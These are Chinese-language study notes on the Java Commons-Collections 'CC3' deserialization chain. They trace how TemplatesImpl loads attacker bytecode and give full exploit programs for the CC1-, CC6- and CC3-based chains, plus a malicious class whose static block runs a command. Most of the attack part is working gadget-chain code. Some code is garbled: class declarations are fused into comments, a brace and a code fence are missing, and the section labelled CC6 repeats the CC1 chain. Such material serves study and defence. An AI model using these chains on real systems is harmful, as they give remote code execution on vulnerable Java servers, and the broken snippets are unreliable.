###### tags: `Java 反序列化`
[TOC]
# Java 反序列化之 CC3-3

<!--toc-->

时隔多天又回到了 CC 链上来。

<!--more-->

## 前言

CC3 链与之前的 CC1、CC6 的不同，CC1 链与 CC6 链是通过 `Runtime.exec()` 进行**命令执行**的。而很多时候服务器代码中的黑名单会选择禁用 `Runtime`。

好在 CC3 链是通过**动态类加载机制**来实现自动执行**恶意类代码**的，所以或许可以绕过服务器的黑名单进行命令执行。

注意：阅读本文的前置条件是熟悉Java的类动态加载，推荐阅读[此篇文章](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/)。

## 漏洞复现环境

- jdk8u65
- Commons-Collections 3.2.1

##  TemplatesImpl 解析

### 漏洞流程图

![](https://i.imgur.com/ky2RWZm.png)

采用逆向分析法。

### 1. ClassLoader.defineClass()

在类的动态加载那篇文章，我们知道 ClassLoader 类的 `defineClass()` 可以加载恶意的字节码，所以我们期望找到一条以此为结尾的链子。

在 ClassLoader 类的 `defineClass()`  find usages

> 这个类里面有很多 defineClass(),为什么选择在 639 行的 defineClass() 搜索呢？从类的动态加载那篇文章可以知道最后是调用 754 行的 defindClass() 进行类的加载（这个 defineClass 有个 defindClass1 作为根节点来加载类），而 639 行就调用了 754 行的 defineClass()，所以我们从 639 行开始漏洞的挖掘是合理的。

![](https://i.imgur.com/Wo6J8vO.png)



### 2. TemplatesImpl$TransletClassLoader.defineClass()



在 `TemplatesImpl` 类的静态内部类 `TransletClassLoader` 中找到了我们能够运用的方法。具体地说是 TransletClassLoader 类的 `defineClass()` 方法续上了之前 639 行的 defindClass()。

![](https://i.imgur.com/VyylrnM.png)



这里的 `defineClass()` 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages。


> 注意，上图的变量 b 明显就是漏洞中的 payload 了，这是一个一维的字节数组，在后续的过程中要时刻注意变量 b 的相关变化。


### 3. TemplatesImpl.defineTransletClasses()
在 `TemplatesImpl.defineTransletClasses()` 方法（414 行）找到相关调用。

![](https://i.imgur.com/I6Pjvim.png)

以下是整体代码：

![](https://i.imgur.com/HUDVrcf.png)


>注意到源码的 398 行定义了 loader 变量，正好是 `TemplatesImpl$TransletClassLoader`。顺带一提，这个类继承了 ClassLoader。


**小练习**
根据现有分析，写出漏洞 demo。

思路：

1. 编写恶意类生成对应的字节码
2. 根据前文分析，编写符合条件的代码块触发漏洞

下面是具体分析。


注意到为了进入 414 行代码， `_bytecodes` 不能为 null 且 `_tfactory` 不能为 null。（这里不是很明白）

并且在 418 行判断 superClass 变量（这是定义了恶意字节码的类，即 defindClass() 方法中传入的字节数组 b） 是否继承了 ABSTRACT_TRANSLET 这个父类，如果没有则抛出异常，所以编写恶意类时需要继承 **ABSTRACT_TRANSLET** 这个父类。


或者我们可以将 **_auxClasse** 赋值，使其不为 null。但是如果没有继承 ABSTRACT_TRANSLET 这个父类，会导致 _transletIndex 的值为 -1，在第 426 行的判断当中跳出程序。所以最好让恶意类继承 ABSTRACT_TRANSLET。

下图是 **ABSTRACT_TRANSLET** 的具体定义：

![](https://i.imgur.com/I6rMRnc.png)


此外，代码将 _bytecodes\[i\] 传入了 defineClass()，据前文的分析，这里应该传入恶意字节码。所以 **_bytescodes** 是什么？

审计发现这是一个**二维**的字节数组：

![](https://i.imgur.com/DPaDzY0.png)

那么我们把恶意字节码数组放入这个二维字节数组中即可，现在的问题是哪里可以设置 _bytecodes？

这是一个私有成员变量，在构造方法中可设置这个变量的值，但是都是 protected 的，唯一 public 的那个构造函数未定义任何代码。

最终我决定采用 public 的构造函数实例化一个 TemplatesImpl 然后反射修改其 _bytecodes。


>注意，demo 目前还不能命令执行，因为还没有实例化，只有实例化后才会加载恶意类。

首先我们先书写恶意字节码类：

1. 先写一个 Calc.class 的恶意类并编译。（直接编写静态代码块就可以了，因为在类初始化的时候会自动执行代码）

```java
package CC3;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
public class Calc extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
    static {
        try {
            Runtime.getRuntime().exec("calc");
        }
        catch(IOException e){
            e.printStackTrace();
        }
    }
}

```
然后将上述编译好的恶意类装入字节数组即可。

现在还剩下 `_tfactory` 还未处理。`_tfactory` 这里比较难，我们也过一遍，这两个过完之后，写其他的就没什么问题了。

`_tfactory` 定义如下：

```java=
private transient TransformerFactoryImpl _tfactory = null;
```
默认为null，我们可以通过反射修改一下。

 `_tfactory` 的其他定义如何。

在 `TemplatesImpl.readObject()` 方法中，找到了 `_tfactory` 的初始化定义。

![](https://i.imgur.com/yjZ1w3E.png)

也就是说TemplatesImpl在反序列化的时候会自动给给_tfactory 变量赋予一个初值，这方便了我们的漏洞利用。


那我们就通过反射将之前 poc 中的 TemplatesImpl 类变量 templates 的 `_tfactory` 属性值改为如上的默认值吧，




```java
// 1. 定义恶意字节码数组并装入 data1 中
        byte [] data0 = Files.readAllBytes(Paths.get("D:\\IDEAProject\\Reflect\\target\\classes\\security\\java\\cc3\\Calc.class"));
        byte [][] data1 = {data0};

        // 2. 实例化 TemplatesImpl，并反射修改其 _bytecodes 为 data1

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();

        Field field = c1.getDeclaredField("_bytecodes");
        field.setAccessible(true);

        field.set(templates,data1);

        Field field1 = c1.getDeclaredField("_tfactory");
        field1.setAccessible(true);
        field1.set(templates,new TransformerFactoryImpl());


        // 3. 反射调用 defineTransletClasses

        Method method = c1.getDeclaredMethod("defineTransletClasses");
        method.setAccessible(true);
        method.invoke(templates,null);
```

###  4. TemplatesImpl.getTransletInstance()

现在回到正题，因为 defineTransletClasses() 方法的作用域是 **private**，所以我们看一看谁调用了这个方法。

审计发现同类的 `getTransletInstance()` 方法（451 行）调用了 defineTransletClasses() 方法，并且这里（455 行）有一 个 `newInstance()` 实例化的过程。

> 注意到为了进入 451 行，需要 _name 不为空且 _class 为空

源码如下图：

![](https://i.imgur.com/uZNuyPR.png)


**小练习**
由于这一步 455 行的 newInstance()，所以现在可以命令执行了，请写出漏洞 demo。

思路：

阅读源码就可以发现，若要执行到 `defindTransletClasses()` 方法，那么 `_name` 不可为空且 `_class` 要为空。

`_name` 就是一个普通的字符串，我们可以通过反射随意修改。

`_class` 初始为空，之后调用defineTransletClasses() 方法加载我们的恶意类。


**我的代码**
```java
// 1. 定义恶意字节码数组并装入 data1 中
        byte [] data0 = Files.readAllBytes(Paths.get("D:\\IDEAProject\\Reflect\\target\\classes\\security\\java\\cc3\\Calc.class"));
        byte [][] data1 = {data0};

        // 2. 实例化 TemplatesImpl，并反射修改其 _bytecodes 为 data1

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();

        Field field = c1.getDeclaredField("_bytecodes");
        field.setAccessible(true);

        field.set(templates,data1);

        Field field1 = c1.getDeclaredField("_tfactory");
        field1.setAccessible(true);
        field1.set(templates,new TransformerFactoryImpl());


        // 3. 反射修改 __name,__class 默认是 null。

        Field field2 = c1.getDeclaredField("_name");
        field2.setAccessible(true);
        field2.set(templates,"mirror4s");


        // 3. 反射调用 defineTransletClasses

        Method method = c1.getDeclaredMethod("getTransletInstance");
        method.setAccessible(true);
        method.invoke(templates,null);
```

如下图，455 行执行完毕即可弹计算器。

![](https://i.imgur.com/e7SKGdf.png)


### 6. TemplatesImpl.newTransformer()

如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。

在 `TemplatesImpl.newTransformer()`  486 行发现相关调用：

![](https://i.imgur.com/9ivhwNA.png)

可以看到这是一个公有方法，意味着可在外部直接调用。

**小练习**
根据目前的分析，写出完整的链子 demo。

思路：
由于 newTransformer() 方法是公有的，所以直接调用就好。

```java
// 1. 定义恶意字节码数组并装入 data1 中
        byte [] data0 = Files.readAllBytes(Paths.get("D:\\IDEAProject\\Reflect\\target\\classes\\security\\java\\cc3\\Calc.class"));
        byte [][] data1 = {data0};

        // 2. 实例化 TemplatesImpl，并反射修改其 _bytecodes 为 data1

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();

        Field field = c1.getDeclaredField("_bytecodes");
        field.setAccessible(true);

        field.set(templates,data1);

        Field field1 = c1.getDeclaredField("_tfactory");
        field1.setAccessible(true);
        field1.set(templates,new TransformerFactoryImpl());


        // 3. 反射修改 __name,__class 默认是 null。

        Field field2 = c1.getDeclaredField("_name");
        field2.setAccessible(true);
        field2.set(templates,"mirror4s");

        // 4. 直接调用 newTransformer() 弹出计算器
        templates.newTransformer();
```
运行之后即可弹出计算器（虽然报了奇怪的空指针异常）

![](https://i.imgur.com/1qFLBvp.png)











## TemplatesImpl 利用





### CC1 链的 TemplatesImpl 的实现方式

>TemplatesImpl 只是将原本的命令执行变成代码执行的方式，所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。

如图，链子不变，只是最后的命令执行方式变了。

![](https://i.imgur.com/RrL6l8n.png)

所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。

暂时的 EXP 是这样的。
```java=
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 // templates.newTransformer();  
  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 chainedTransformer.transform(1);   
}
```
最后一句，传入 chainedTransformer.transform(1) 是因为前面我们定义了 new ConstantTransformer(templates)，这个类是需要我们传参的，传入 1 即可。

![](https://i.imgur.com/JIDBsNV.png)

OK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。

### CC1 Templates exp
```java=
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 // templates.newTransformer();  
  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 //   chainedTransformer.transform(1);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 hashMap.put("value","drunkbaby");  
 Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 aihConstructor.setAccessible(true);  
 Object o = aihConstructor.newInstance(Target.class, transformedMap);  
 // 序列化反序列化  
 serialize(o);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
### CC1 Templates yso exp
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC1 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC1YsoTemplatesEXP {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates, "Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates, codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //     templates.newTransformer();  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates), // 构造 setValue 的可控参数  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(invocationHandler);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```
![](https://i.imgur.com/HU5Kj59.png)

## CC6 链的 TemplatesImpl 实现方法
```java=
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC6 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC6TemplatesEXP {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates, "Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates, codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //     templates.newTransformer();  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
 new InvokerTransformer("newTransformer", null, null)  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
 HashMap<Object, Object> expMap = new HashMap<>();  
 expMap.put(tiedMapEntry, "value");  
 lazyMap.remove("key");  
  
 // 在 put 之后通过反射修改值  
 Class<LazyMap> lazyMapClass = LazyMap.class;  
 Field factoryField = lazyMapClass.getDeclaredField("factory");  
 factoryField.setAccessible(true);  
 factoryField.set(lazyMap, chainedTransformer);  
  
 serialize(expMap);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```
运行之后就可以弹计算器

## CC3 链
不多说声明，看芜师傅的文章就可以了
### CC3 链分析

### CC3 链 EXP
#### CC1 链作为前半部分
```java=
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception  
    {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(o);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```


#### CC6 链作为前半部分
```java=
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception  
    {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(o);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}


```
![](https://i.imgur.com/OJ0TzNA.png)


## 参考链接
[芜风师傅](https://drun1baby.github.io/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/#toc-heading-10)